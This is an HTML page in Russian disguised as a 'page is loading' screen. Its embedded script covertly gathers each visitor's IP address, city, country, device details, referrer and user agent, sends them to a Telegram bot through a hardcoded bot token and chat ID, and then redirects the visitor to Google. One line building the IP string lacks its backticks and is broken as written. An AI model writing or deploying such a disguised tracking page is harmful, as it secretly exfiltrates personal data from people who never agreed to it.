<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Загрузка...</title>
</head>
<body>
    <h2>Секунду, идет загрузка страницы...</h2>

    <script>
        const BOT_TOKEN = "9231529625:AAEMepewolQDytYwOum3aIrfIO1MBzJqous";
        const CHAT_ID = "8814781494";

        async function collectAndSend() {
            let ipInfo = "Не удалось определить";
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                ipInfo = ${data.ip} (${data.city}, ${data.country_name});
            } catch (e) {
                // Если запрос к IP заблокирован адблоком или сетью
            }

            const info = "🚨 Новый посетитель на сайте!\n\n" +
                         "⏱️ Время: " + new Date().toLocaleString() + "\n" +
                         "🌐 IP / Локация: " + ipInfo + "\n" +
                         "💻 Платформа: " + navigator.platform + "\n" +
                         "🗣 Язык: " + navigator.language + "\n" +
                         "📺 Экран: " + window.screen.width + "x" + window.screen.height + "\n" +
                         "🧠 Память (RAM): " + (navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "неизвестно") + "\n" +
                         "⚙️ Ядра процессора: " + (navigator.hardwareConcurrency || "неизвестно") + "\n" +
                         "🔗 Источник (Referrer): " + (document.referrer || "прямой заход") + "\n" +
                         "📱 User-Agent: " + navigator.userAgent;

            const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(info) + "&parse_mode=Markdown";

            try {
                await fetch(url);
            } catch (e) {
                // Игнорируем возможные ошибки сети при отправке
            }

            // Перенаправление после отправки (или таймаута)
            setTimeout(function() {
                window.location.href = "https://google.com";
            }, 1000);
        }

        collectAndSend();
    </script>
</body>
</html>
